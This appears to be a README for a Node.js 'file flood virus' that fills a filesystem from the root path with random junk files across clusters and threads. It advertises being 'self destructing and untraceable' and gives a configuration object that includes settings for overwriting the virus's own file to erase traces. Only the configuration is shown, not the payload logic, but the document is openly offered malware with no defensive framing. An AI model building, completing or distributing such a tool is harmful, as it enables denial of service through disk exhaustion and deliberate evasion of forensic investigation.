# nodejs-virus-non-resident-file-flooder
#### non-resident file flood virus

* multi cluster support
* multiple async threads per cluster
* self destructing and untraceable

```js
const config = {
  dest: '/', // file flood base path
  clusters: 1, // clusters
  threads: 1, // async threads per cluster
  pad_size: 1024, // random data pad size max
  file: {
    max_file_size: 512, // random data file size max
    max_name_size: 16, // random filename max length
    ext: ['', 'txt', 'css'] // random file extensions
  },
  alpha: 'abcdefghijklmnopqrstuvwxyz', // random filename alphabet (uppercase added automatically)
  special: '1234567890', // random filename special chars/numbers
  wipe: {
    rounds: 10, // virus file wipe random data write rounds
    delay: 3000 // virus file wipe delay
  }
}

```
